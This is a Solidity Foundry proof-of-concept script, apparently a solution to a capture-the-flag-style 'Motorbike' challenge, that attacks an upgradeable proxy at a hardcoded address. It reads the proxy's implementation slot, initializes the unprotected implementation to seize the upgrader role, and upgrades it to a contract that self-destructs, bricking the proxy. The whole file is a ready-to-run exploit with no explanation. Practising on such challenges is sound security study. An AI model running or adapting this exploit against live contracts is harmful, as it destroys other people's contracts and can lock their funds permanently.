// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";

interface Target {
    function initialize() external;
    function upgrader() external view returns(address);
}

interface Engine {
    function initialize() external;
    function upgrader() external view returns(address);
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Hack {
    function exploit() external {
        selfdestruct(payable(tx.origin));
    }
}

contract POC is Script {
    Target public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Target(0x964e6e9020C87C98acB7a3873DEd4aa756B30735);
        Engine engine = Engine(address(uint160(uint256(vm.load(address(target), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));
        Hack hack = new Hack();
        engine.initialize();

        address upgrader_ = engine.upgrader();
        console.log("upgrader: ", upgrader_);

        bytes memory payload = abi.encodeWithSignature("exploit()");
        engine.upgradeToAndCall(address(hack), payload);

        vm.stopBroadcast();
    }
}